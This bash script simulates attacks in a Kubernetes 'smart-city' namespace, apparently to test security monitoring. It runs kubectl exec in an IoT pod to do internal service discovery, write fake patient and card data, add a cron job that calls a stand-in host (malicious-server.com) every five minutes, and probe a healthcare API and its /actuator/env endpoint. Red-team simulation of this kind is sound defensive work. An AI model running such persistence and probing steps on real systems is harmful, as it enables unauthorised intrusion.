#!/bin/bash

echo "🎯 Generating Advanced Attack Scenarios..."

ATTACK_POD=$(kubectl get pods -n smart-city -l app=iot-device -o jsonpath='{.items[0].metadata.name}')

# 1. LATERAL MOVEMENT SIMULATION
echo "1. 🔄 Lateral Movement Simulation"
kubectl exec -n smart-city $ATTACK_POD -c iot-sensor -- sh -c '
echo "Attempting service discovery..."
nslookup healthcare-api-service.smart-city.svc.cluster.local > /dev/null
nslookup prometheus.monitoring.svc.cluster.local > /dev/null
echo "Internal service discovery completed"
'
echo ""

# 2. DATA EXFILTRATION ATTEMPT
echo "2. 📤 Data Exfiltration Attempt"
kubectl exec -n smart-city $ATTACK_POD -c iot-sensor -- sh -c '
echo "Creating fake sensitive data..."
echo "patient_data=john_doe:medical_history:confidential" > /tmp/sensitive.txt
echo "credit_cards=1234-5678-9012-3456" >> /tmp/sensitive.txt
echo "Sensitive data created, attempting exfiltration simulation"
'
echo ""

# 3. PERSISTENCE MECHANISM
echo "3. ⏰ Persistence Mechanism"
kubectl exec -n smart-city $ATTACK_POD -c iot-sensor -- sh -c '
echo "Adding cron job for persistence..."
(crontab -l 2>/dev/null; echo "*/5 * * * * curl http://malicious-server.com/checkin") | crontab - 2>/dev/null || echo "Cron modification attempted"
echo "Persistence mechanism simulated"
'
echo ""

# 4. APPLICATION EXPLOITATION
echo "4. 🎯 Application Exploitation"
kubectl exec -n smart-city $ATTACK_POD -c iot-sensor -- sh -c '
echo "Simulating application vulnerabilities..."
curl -s "http://healthcare-api-service:8080/api/patients/1" -H "User-Agent: sqlmap" > /dev/null
curl -s "http://healthcare-api-service:8080/actuator/env" > /dev/null
echo "Application exploitation patterns sent"
'
echo ""

echo "✅ Advanced attack scenarios generated!"

